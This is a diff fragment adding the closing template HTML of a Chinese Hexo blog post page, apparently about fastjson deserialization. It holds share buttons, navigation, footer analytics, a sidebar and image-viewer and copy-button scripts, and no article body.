+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://xianbeil.github.io/2022/04/27/fastjson1-22templates/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/fastjson/" rel="tag">fastjson</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2022/04/27/pwnhub2022%E6%98%A5%E5%AD%A3%E8%B5%9B/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            pwnhub2022春季赛
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2022/04/19/starctf2022/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">starctf2022</div>
+      </a>
+    
+  </nav>
+
+  
+   
+    
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2022
+        <i class="ri-heart-fill heart_icon"></i> John Doe
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Hexo"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeba4nlj208c08c3z9.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://tvax4.sinaimg.cn/large/9156bd04ly1gzofeo49ywj208c08cgmz.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
